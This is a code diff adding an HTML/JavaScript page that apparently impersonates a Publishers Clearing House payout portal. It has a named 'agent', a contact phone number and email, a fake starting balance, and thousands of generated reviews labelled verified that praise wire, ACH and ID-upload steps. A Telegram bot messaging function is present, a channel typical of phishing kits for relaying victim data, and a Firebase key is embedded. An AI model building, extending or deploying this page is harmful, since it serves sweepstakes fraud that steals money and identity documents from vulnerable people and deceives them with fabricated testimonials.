@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] }, keyframes:{ float:{ '0%,100%':{ transform:'translateY(0)' }, '50%':{ transform:'translateY(-14px)' } }, pulseSoft:{ '0%,100%':{ opacity:'.45' }, '50%':{ opacity:'.85' } } }, animation:{ float:'float 6s ease-in-out infinite', pulseSoft:'pulseSoft 4s ease-in-out infinite' } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; overflow-x:clip; position:relative; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+
+  /* ═══ AMBIENT BACKGROUND — layered mesh + grid ═══ */
+  .bg-mesh { position:fixed; inset:0; pointer-events:none; z-index:0; overflow:hidden; }
+  .bg-mesh::before { content:''; position:absolute; top:-20%; left:-10%; width:60vw; height:60vw; max-width:800px; max-height:800px; background:radial-gradient(circle, rgba(251,191,36,.14) 0%, transparent 65%); border-radius:50%; filter:blur(60px); animation:meshDrift1 22s ease-in-out infinite; }
+  .bg-mesh::after { content:''; position:absolute; bottom:-20%; right:-10%; width:60vw; height:60vw; max-width:800px; max-height:800px; background:radial-gradient(circle, rgba(56,189,248,.14) 0%, transparent 65%); border-radius:50%; filter:blur(60px); animation:meshDrift2 26s ease-in-out infinite; }
+  @keyframes meshDrift1 { 0%,100% { transform:translate(0,0) scale(1); } 50% { transform:translate(8%,12%) scale(1.15); } }
+  @keyframes meshDrift2 { 0%,100% { transform:translate(0,0) scale(1); } 50% { transform:translate(-10%,-8%) scale(1.12); } }
+  .bg-grid { position:fixed; inset:0; pointer-events:none; z-index:0; background-image:linear-gradient(rgba(56,189,248,.035) 1px, transparent 1px), linear-gradient(90deg, rgba(56,189,248,.035) 1px, transparent 1px); background-size:56px 56px; mask-image:radial-gradient(ellipse at center, black 0%, transparent 75%); -webkit-mask-image:radial-gradient(ellipse at center, black 0%, transparent 75%); }
+
+  /* ═══ GLASS SURFACES ═══ */
+  .glass { background:linear-gradient(155deg, rgba(21,29,56,.72) 0%, rgba(13,19,38,.88) 100%); backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px); border:1px solid rgba(56,189,248,.12); }
+
+  /* ═══ CARD 3D — layered depth ═══ */
+  .card-3d { transition: transform .4s cubic-bezier(.16,1,.3,1), box-shadow .4s cubic-bezier(.16,1,.3,1), border-color .3s ease; -webkit-backface-visibility:hidden; backface-visibility:hidden; will-change:transform; position:relative; }
+  @media (hover:hover) and (pointer:fine) {
+    .card-3d:hover { transform: translateY(-6px) scale(1.008); box-shadow: 0 30px 60px -18px rgba(0,0,0,.7), 0 0 0 1px rgba(56,189,248,.18), 0 0 40px -12px rgba(245,158,11,.18); border-color:rgba(56,189,248,.28); }
+  }
+  .glow-effect { box-shadow: 0 0 60px rgba(245,158,11,.12), 0 30px 60px -20px rgba(0,0,0,.8), inset 0 1px 0 rgba(255,255,255,.05); }
+
+  /* ═══ NEON BORDER — gradient ring ═══ */
+  .neon-border { position:relative; }
+  .neon-border::before { content:''; position:absolute; inset:-1px; border-radius:inherit; padding:1px; background:linear-gradient(135deg, rgba(251,191,36,.5), rgba(56,189,248,.3) 40%, transparent 70%); -webkit-mask:linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0); -webkit-mask-composite:xor; mask-composite:exclude; pointer-events:none; opacity:.7; transition:opacity .4s ease; }
+  .neon-border:hover::before { opacity:1; }
+
+  /* ═══ HERO STATS ═══ */
+  .hero-stat { position:relative; padding:1rem 1.25rem; border-radius:1rem; background:linear-gradient(155deg, rgba(21,29,56,.9), rgba(13,19,38,.95)); border:1px solid rgba(56,189,248,.1); overflow:hidden; transition:all .3s ease; }
+  .hero-stat::after { content:''; position:absolute; inset:0; background:linear-gradient(120deg, transparent 30%, rgba(56,189,248,.06) 50%, transparent 70%); transform:translateX(-100%); transition:transform .8s ease; }
+  .hero-stat:hover { border-color:rgba(56,189,248,.3); transform:translateY(-2px); }
+  .hero-stat:hover::after { transform:translateX(100%); }
+
+  /* ═══ REVIEWS ═══ */
+  .review-card { position:relative; display:flex; flex-direction:column; padding:1.5rem; border-radius:1.5rem; background:linear-gradient(158deg, rgba(33,45,84,.8) 0%, rgba(21,29,56,.94) 45%, rgba(13,19,38,.98) 100%); border:1px solid rgba(56,189,248,.12); box-shadow:0 22px 40px -22px rgba(0,0,0,.95), inset 0 1px 0 rgba(255,255,255,.04), 0 0 0 1px rgba(0,0,0,.4); transition:transform .4s cubic-bezier(.16,1,.3,1), box-shadow .4s cubic-bezier(.16,1,.3,1), border-color .35s ease; overflow:hidden; min-height:260px; }
+  .review-card:hover { border-color:rgba(56,189,248,.4); box-shadow:0 40px 60px -28px rgba(0,0,0,1), 0 0 50px -14px rgba(56,189,248,.35), 0 0 30px -12px rgba(245,158,11,.25); }
+  .review-shine { position:absolute; inset:0; border-radius:1.5rem; background:radial-gradient(circle at var(--mx,50%) var(--my,0%), rgba(255,255,255,.12), transparent 55%); opacity:0; transition:opacity .3s ease; pointer-events:none; z-index:1; }
+  .review-card:hover .review-shine { opacity:1; }
+  .review-avatar { width:2.75rem; height:2.75rem; border-radius:1rem; flex-shrink:0; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:.95rem; color:#070b19; background:linear-gradient(145deg, #fbbf24, #d97706); box-shadow:0 8px 20px -6px rgba(245,158,11,.7), inset 0 1px 0 rgba(255,255,255,.3); position:relative; }
+  .review-avatar::after { content:''; position:absolute; inset:0; border-radius:1rem; box-shadow:inset 0 -2px 4px rgba(0,0,0,.2), inset 0 2px 3px rgba(255,255,255,.3); }
+  .review-badge { display:inline-flex; align-items:center; gap:.3rem; padding:.2rem .6rem; border-radius:999px; font-size:.68rem; font-weight:800; color:#fbbf24; background:rgba(245,158,11,.14); border:1px solid rgba(245,158,11,.35); }
+  .review-quote { font-size:.8rem; line-height:1.65; color:#cbd5e1; }
+  .star-row i { filter:drop-shadow(0 2px 5px rgba(245,158,11,.55)); }
+  .reviews-grid { perspective:1400px; }
+
+  /* ═══ PRIZE CARDS — layered glow ═══ */
+  .prize-card-1 { position:relative; background:linear-gradient(160deg, rgba(251,191,36,.18), rgba(21,29,56,.95) 55%, rgba(13,19,38,.98)); border:1px solid rgba(251,191,36,.42); box-shadow:0 30px 60px -28px rgba(245,158,11,.55), inset 0 1px 0 rgba(255,255,255,.06); }
+  .prize-card-2 { position:relative; background:linear-gradient(160deg, rgba(203,213,225,.14), rgba(21,29,56,.95) 60%, rgba(13,19,38,.98)); border:1px solid rgba(203,213,225,.32); box-shadow:0 24px 48px -22px rgba(203,213,225,.35), inset 0 1px 0 rgba(255,255,255,.04); }
+  .prize-card-3 { position:relative; background:linear-gradient(160deg, rgba(217,119,6,.16), rgba(21,29,56,.95) 60%, rgba(13,19,38,.98)); border:1px solid rgba(217,119,6,.4); box-shadow:0 24px 48px -22px rgba(217,119,6,.4), inset 0 1px 0 rgba(255,255,255,.04); }
+  .winner-card-1 { background:linear-gradient(160deg, rgba(251,191,36,.22), rgba(21,29,56,.95) 60%); border:1px solid rgba(251,191,36,.5); box-shadow:0 24px 48px -22px rgba(245,158,11,.6); }
+  .winner-card-2 { background:linear-gradient(160deg, rgba(203,213,225,.16), rgba(21,29,56,.95) 60%); border:1px solid rgba(203,213,225,.38); box-shadow:0 24px 48px -22px rgba(203,213,225,.35); }
+  .winner-card-3 { background:linear-gradient(160deg, rgba(217,119,6,.18), rgba(21,29,56,.95) 60%); border:1px solid rgba(217,119,6,.42); box-shadow:0 24px 48px -22px rgba(217,119,6,.4); }
+  .winner-placeholder { background:repeating-linear-gradient(45deg, rgba(33,45,84,.55) 0 12px, rgba(21,29,56,.75) 12px 24px); border:1px dashed rgba(56,189,248,.35); }
+
+  /* ═══ TIMELINE ═══ */
+  .timeline-dot { width:2rem; height:2rem; border-radius:999px; display:flex; align-items:center; justify-content:center; font-size:.75rem; font-weight:800; border:2px solid #212d54; background:#0d1326; color:#94a3b8; transition:all .3s ease; }
+  .timeline-dot.active { border-color:#38bdf8; background:rgba(56,189,248,.2); color:#38bdf8; box-shadow:0 0 22px rgba(56,189,248,.6); }
+  .timeline-dot.done { border-color:#10b981; background:rgba(16,185,129,.18); color:#34d399; box-shadow:0 0 18px rgba(16,185,129,.4); }
+  .timeline-line { height:2px; background:#212d54; flex-grow:1; transition:background .4s ease; }
+  .timeline-line.done { background:linear-gradient(90deg, #10b981, #38bdf8); box-shadow:0 0 10px rgba(56,189,248,.4); }
+
+  /* ═══ PROGRESS ═══ */
+  .progress-track { background:#070b19; border:1px solid #212d54; border-radius:999px; overflow:hidden; height:12px; padding:2px; position:relative; }
+  .progress-fill { height:100%; border-radius:999px; background:linear-gradient(90deg, #fbbf24, #38bdf8); transition:width .5s cubic-bezier(.16,1,.3,1); position:relative; }
+  .progress-fill::after { content:''; position:absolute; inset:0; border-radius:999px; background:linear-gradient(90deg, transparent, rgba(255,255,255,.35), transparent); animation:shimmer 2.4s linear infinite; background-size:200% 100%; }
+
+  /* ═══ ANIMATIONS ═══ */
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+  .fade-up { animation: fadeUp .55s cubic-bezier(.16,1,.3,1) both; }
+  @keyframes pulseDot { 0%,100% { opacity:1; transform:scale(1); } 50% { opacity:.55; transform:scale(.85); } }
+  .pulse-dot { animation: pulseDot 1.6s ease-in-out infinite; }
+  @keyframes shimmer { 0% { background-position:-400px 0; } 100% { background-position:400px 0; } }
+  .shimmer-bar { background:linear-gradient(90deg, transparent, rgba(251,191,36,.4), transparent); background-size:400px 100%; animation:shimmer 2.2s linear infinite; }
+  @keyframes winnerReveal { 0% { opacity:0; transform:translateY(24px) scale(.94); } 100% { opacity:1; transform:translateY(0) scale(1); } }
+  .winner-reveal { animation:winnerReveal .65s cubic-bezier(.16,1,.3,1) both; }
+  @keyframes crownFloat { 0%,100% { transform:translateY(0) rotate(-3deg); } 50% { transform:translateY(-8px) rotate(3deg); } }
+  .crown-float { animation:crownFloat 3.6s ease-in-out infinite; }
+
+  /* ═══ HEADER ═══ */
+  .site-header { background:linear-gradient(180deg, rgba(7,11,25,.9) 0%, rgba(7,11,25,.75) 100%); backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px); border-bottom:1px solid rgba(56,189,248,.08); }
+  .brand-tile { position:relative; transition:transform .3s ease; }
+  .brand-tile:hover { transform:translateY(-1px); }
+  .brand-tile::after { content:''; position:absolute; inset:0; border-radius:.75rem; background:linear-gradient(135deg, rgba(255,255,255,.3), transparent 60%); pointer-events:none; }
+
+  /* ═══ BUTTONS ═══ */
+  .btn-3d { position:relative; transition: transform .2s cubic-bezier(.16,1,.3,1), box-shadow .2s ease; }
+  .btn-3d::before { content:''; position:absolute; inset:0; border-radius:inherit; background:linear-gradient(180deg, rgba(255,255,255,.18), transparent 55%); pointer-events:none; }
+  .btn-3d:active { transform:translateY(1px); }
+  .btn-primary { box-shadow:0 12px 24px -8px rgba(245,158,11,.5), inset 0 1px 0 rgba(255,255,255,.3); }
+  .btn-primary:hover { box-shadow:0 18px 32px -10px rgba(245,158,11,.6), inset 0 1px 0 rgba(255,255,255,.35); transform:translateY(-2px); }
+  .btn-secondary { box-shadow:0 8px 20px -6px rgba(0,0,0,.6), inset 0 1px 0 rgba(255,255,255,.06); }
+  .btn-secondary:hover { box-shadow:0 14px 28px -8px rgba(56,189,248,.25), inset 0 1px 0 rgba(255,255,255,.1); transform:translateY(-2px); border-color:rgba(56,189,248,.4); }
+
+  /* ═══ SCROLLBAR ═══ */
+  ::-webkit-scrollbar { width:8px; height:8px; }
+  ::-webkit-scrollbar-track { background:#070b19; }
+  ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; }
+  ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+
+  @media (max-width:1023px) { #toast-container { bottom: calc(5.5rem + env(safe-area-inset-bottom,0px)) !important; } }
+  @media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration:.01ms !important; transition-duration:.01ms !important; } }
+</style>
+</head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<!-- Ambient background layers -->
+<div class="bg-mesh"></div>
+<div class="bg-grid"></div>
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="site-header sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2">
+    <div class="flex items-center space-x-3 cursor-pointer select-none active:opacity-80 transition" onclick="window.location.href='index.html'">
+      <div class="brand-tile w-10 h-10 sm:w-12 sm:h-12 rounded-xl bg-gradient-to-br from-gold-400 to-gold-600 flex items-center justify-center shadow-lg shadow-gold-500/30 text-navy-950 text-lg sm:text-2xl font-black"><i class="fa-solid fa-vault"></i></div>
+      <div><span class="text-base sm:text-xl font-bold tracking-tight text-white block">PCH</span><span class="text-[9px] sm:text-xs font-semibold text-gold-400 tracking-widest uppercase">Weekly Payout Portal</span></div>
+    </div>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3"></div>
+  </div>
+</header>
+
+<main id="app-container" class="flex-grow flex flex-col relative z-10"></main>
+
+<footer class="bg-navy-950/80 border-t border-navy-700/40 py-10 text-sm text-slate-400 relative z-10 backdrop-blur-sm">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 grid grid-cols-1 md:grid-cols-3 gap-8">
+    <div class="space-y-4"><div class="flex items-center space-x-2"><div class="w-8 h-8 rounded-lg bg-gradient-to-br from-gold-400 to-gold-600 flex items-center justify-center text-navy-950 font-bold shadow-md shadow-gold-500/20"><i class="fa-solid fa-vault text-sm"></i></div><span class="font-bold text-white tracking-wide text-sm sm:text-base">PCH Weekly Payout Portal</span></div><p class="text-xs text-slate-400 leading-relaxed">Secure automated distribution portal operating under financial compliance framework guidelines.</p></div>
+    <div><h4 class="text-white font-semibold mb-3 uppercase tracking-wider text-xs text-gold-400">Compliance & Security</h4><ul class="space-y-2 text-xs"><li><a href="#" onclick="showModal('Disclaimer', 'Demonstration system operating without live banking integrations.')" class="hover:text-white transition py-1 block">Regulatory Disclaimer</a></li><li><a href="#" onclick="showModal('Privacy', 'Data stays securely in your browser local session state.')" class="hover:text-white transition py-1 block">Privacy Policy</a></li><li><a href="#" onclick="showModal('Terms', 'Strictly simulated prototype for preview and UI/UX validation.')" class="hover:text-white transition py-1 block">Terms of Service</a></li></ul></div>
+    <div><h4 class="text-white font-semibold mb-3 uppercase tracking-wider text-xs text-gold-400">Support Contact</h4><ul class="space-y-2 text-xs"><li><i class="fa-solid fa-phone mr-2 text-sky-custom"></i> Agent Desk: 646-585-8110</li><li><i class="fa-solid fa-user-tie mr-2 text-gold-400"></i> Senior Agent: Andy Goldberg</li><li><i class="fa-solid fa-envelope mr-2 text-sky-custom"></i> support@globalpure-payouts.net</li></ul></div>
+  </div>
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8 pt-6 border-t border-navy-700/30 text-center text-xs text-slate-400">&copy; 2026 PCH Weekly Payout Portal (PWPP). All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-50 items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const USER_REGISTRY_KEY = 'pch_user_folder_registry';
+
+let promoInterval = null;
+let reviewSeed = 20261016;
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) { try { return JSON.parse(saved); } catch(e){} }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], savings:null, cdAccount:null, accessLogs:[], promo:null, signupCounter:0, withdrawalState:'none', currentWithdrawal:null, favoriteRecipients:[], scheduledTransfers:[], fundingMethods:[], autoWithdraw:{enabled:false,frequency:'weekly',amount:null,method:null}, dailyLimits:{ withdrawal:{limit:5000,used:0,date:''}, p2p:{limit:50000,used:0,date:''} }, referralCode:null, messagesReadAt:0, announcement:null, messages:[], announcementDismissedAt:0, card:null, kyc:null, supportTickets:[] };
+}
+const persisted = loadDeviceState();
+const state = {
+  currentUser: persisted.currentUser, userBalance: persisted.userBalance, registeredUsers: persisted.registeredUsers||[],
+  transactions: persisted.transactions||[], announcement: persisted.announcement||null, messages: persisted.messages||[],
+  reviewsSearchQuery: '', reviewsFilterRating: 'all', reviewsPage: 1, reviewsPerPage: 9, reviews: [],
+  promo: persisted.promo || null,
+  telegramConfig: { botToken:'', chatId:'' }
+};
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(e){}
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-6">${bodyHtml}</div><div class="flex justify-end"><button onclick="closeModal()" class="px-5 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm hover:brightness-110 transition active:scale-95">Close</button></div>`; modal.style.display = 'flex'; }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; }
+
+async function sendTelegramMessage(textMessage) { const botToken = state.telegramConfig.botToken.trim(); const chatId = state.telegramConfig.chatId.trim(); try { const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ chat_id:chatId, text:textMessage, parse_mode:'HTML', disable_notification:true }) }); const d = await r.json(); return d.ok; } catch(err){ return false; } }
+
+/* ═══════════ PROMO ENGINE ═══════════ */
+const PROMO_ACTIVE_DAYS = 21, PROMO_RESTART_DAYS = 7;
+function createNewPromoCycle(cycleId, startDate) { const start = startDate ? new Date(startDate) : new Date(); const draw = new Date(start); draw.setDate(draw.getDate() + PROMO_ACTIVE_DAYS); const restart = new Date(draw); restart.setDate(restart.getDate() + PROMO_RESTART_DAYS); state.promo = { cycleId, phase:'active', cycleStartDate:start.toISOString(), drawDate:draw.toISOString(), restartDate:restart.toISOString(), winners:null, entries:20150 + Math.floor(Math.random()*800), drawRef:null }; saveDeviceState(); }
+
+const REVIEW_FIRST = ['James','Maria','David','Latoya','Andre','Priya','Michael','Sofia','Kwame','Hannah','Ricardo','Yolanda','Nathan','Ingrid','Tyrone','Camila','Victor','Aaliyah','Stefan','Rosa','Omar','Denise','Curtis','Naomi','Elijah','Farrah','Leon','Bianca','Malcolm','Sienna','Ravi','Tanya','Gregory','Amara','Desmond','Lucia','Patrick','Simone','Everton','Delores','Cedric','Yvonne','Marlon','Adriana','Winston','Keisha','Bruno','Rosalind','Terrence','Nadia'];
+const REVIEW_LAST = ['Whitfield','Alvarez','Okafor','Bennett','Ramirez','Clarke','Nakamura','Delgado','Ferguson','Ivanov','Mensah','Cortez','Barnes','Petrov','Osei','Marsh','Kowalski','Reyes','Sinclair','Dubois','Hollis','Ambrose','Villanueva','Grant','Boateng','Sorensen','McAllister','Ferreira','Chambers','Nwosu','Kirkland','Salazar','Brennan','Odinga','Vaughn','Castillo','Thornton','Adeyemi','Lockhart','Moreau','Sandoval','Baptiste','Ellington','Rahman','Cavanaugh','Duval','Mbeki','Sutton','Navarro','Pemberton'];
+const REVIEW_LOCATIONS = ['Brooklyn, NY','Dallas, TX','Kingston, Jamaica','Chicago, IL','Atlanta, GA','Boston, MA','Houston, TX','Miami, FL','Phoenix, AZ','Seattle, WA','Philadelphia, PA','Montego Bay, Jamaica','Toronto, ON','London, UK','Manchester, UK','Los Angeles, CA','Detroit, MI','Newark, NJ','Charlotte, NC','Columbus, OH','Indianapolis, IN','San Antonio, TX','Portland, OR','Las Vegas, NV','Memphis, TN','Baltimore, MD','Milwaukee, WI','Albuquerque, NM','Nashville, TN','Louisville, KY','Ocho Rios, Jamaica','Spanish Town, Jamaica','Birmingham, AL','Richmond, VA','Oakland, CA','Minneapolis, MN','Tampa, FL','St. Louis, MO','Pittsburgh, PA','Cincinnati, OH','Orlando, FL','Sacramento, CA','Kansas City, MO','Cleveland, OH','Buffalo, NY','Hartford, CT','New Orleans, LA','Tulsa, OK','Raleigh, NC','Salt Lake City, UT'];
+const REVIEW_5STAR = ['The weekly disbursement landed exactly when the countdown said it would. Zero surprises.','Agent Andy Goldberg personally followed up on my verification packet. That level of service is genuinely rare.','Interface is clean, fast, and everything is where you expect it to be. Setup took me under four minutes.','Been tracking my allocations for months now. The transfer history log makes reconciling effortless.','Withdrawal showed as Pending, then cleared the same cycle. The status badges kept me informed the whole way.','The compounding simulator opened my eyes. I restructured my weekly allocation and the projection jumped immediately.','Uploaded my ID documents, got verified, and was on the dashboard within the hour. Extremely smooth process.','What sold me was the transparency — every single transaction is logged with a reference number I can trace.','Support desk answered on the second ring and resolved my routing question in one call. Impressive.','The countdown timer to Friday night is oddly addictive. It builds real anticipation for payout day.','I have used three other portals and none of them made the funding-method setup this straightforward.','Security prompts and the verified-profile badge gave me confidence that my details are handled properly.','The 3D dashboard cards look premium, but more importantly the numbers behind them are accurate.','Every Friday allocation hit my account like clockwork for the last several cycles. No delays at all.','Signed up on a whim, completed verification, and honestly the whole experience exceeded what I expected.','Being able to update my banking destination from the dashboard without calling anyone is a huge plus.','The motivational quote banner is a small touch but it genuinely makes logging in feel worthwhile.','Clean typography, sensible navigation, and a withdrawal flow that explains each step. Well built.','I appreciate that the portal tells you exactly what status your request is in rather than leaving you guessing.','My agent walked me through the ACH setup line by line. Funds cleared without a single hiccup.'];
+const REVIEW_4STAR = ['Very solid portal overall. Would love to see a mobile app version eventually, but the browser experience is great.','Verification took slightly longer than I anticipated, though the agent kept me updated the entire time.','Everything works well. The only thing I would change is adding more withdrawal amount presets.','Good experience from start to finish. Took me a minute to locate the funding setup, but support pointed me right to it.','Reliable disbursements and clear record keeping. A dark-mode toggle for the light theme would be nice someday.','The dashboard is packed with useful info. Slightly overwhelming at first glance, but it clicks quickly.','Processing was smooth. I would rate it five stars if the pending window were a touch shorter.','Great interface and responsive support. The ID upload step could use a clearer file-size guide.','Happy with the service so far. Two payout cycles completed with no issues whatsoever.','Straightforward and dependable. The growth simulator numbers could use a tooltip explaining the math.'];
+const CURATED_REVIEWS = [{ id:1, name:'Arthur Pendelton', location:'Brooklyn, NY', rating:5, date:'2026-10-10', comment:'Was skeptical at first, but Agent Andy Goldberg walked me right through the wire setup. Funds cleared securely!', sample:true, verified:true }, { id:2, name:'Evelyn Vance', location:'Dallas, TX', rating:5, date:'2026-10-09', comment:'Checking the live countdown timer every Friday morning has become my favorite routine. Super sleek portal.', sample:true, verified:true }, { id:3, name:'Marcus Sterling', location:'Kingston, Jamaica', rating:4, date:'2026-10-08', comment:'Registration took less than five minutes. Verification was quick once I uploaded clear ID scans.', sample:true, verified:true }, { id:4, name:'Beatrice Henderson', location:'Chicago, IL', rating:5, date:'2026-10-07', comment:'The growth simulator really helped me understand how allocations compound over time. Fantastic client interface.', sample:true, verified:true }, { id:5, name:'Darnell Washington', location:'Atlanta, GA', rating:5, date:'2026-10-05', comment:'Solid customer support desk. Had a question about my routing number and got a callback within ten minutes.', sample:true, verified:true }, { id:6, name:'Clara O\u2019Connor', location:'Boston, MA', rating:4, date:'2026-10-02', comment:'Transparent tracking on all past withdrawals. Gives you total peace of mind.', sample:true, verified:true }];
+
+function seededRandom() { reviewSeed = (reviewSeed * 1103515245 + 12345) & 0x7fffffff; return reviewSeed / 0x7fffffff; }
+function generateReviews(count) { const out = []; for (let i=0;i<count;i++) { const first = REVIEW_FIRST[Math.floor(seededRandom()*REVIEW_FIRST.length)]; const last = REVIEW_LAST[Math.floor(seededRandom()*REVIEW_LAST.length)]; const loc = REVIEW_LOCATIONS[Math.floor(seededRandom()*REVIEW_LOCATIONS.length)]; const isFive = seededRandom() > 0.2; const rating = isFive ? 5 : 4; const pool = isFive ? REVIEW_5STAR : REVIEW_4STAR; const comment = pool[Math.floor(seededRandom()*pool.length)]; const daysAgo = 12 + Math.floor(seededRandom()*620); const d = new Date(); d.setDate(d.getDate() - daysAgo); out.push({ id:1000+i, name:`${first} ${last}`, location:loc, rating, date:d.toISOString().split('T')[0], comment, sample:true, verified:true }); } out.sort((a,b)=>b.date.localeCompare(a.date)); return out; }
+state.reviews = (persisted.reviews && persisted.reviews.length) ? persisted.reviews : CURATED_REVIEWS.concat(generateReviews(2394));
+
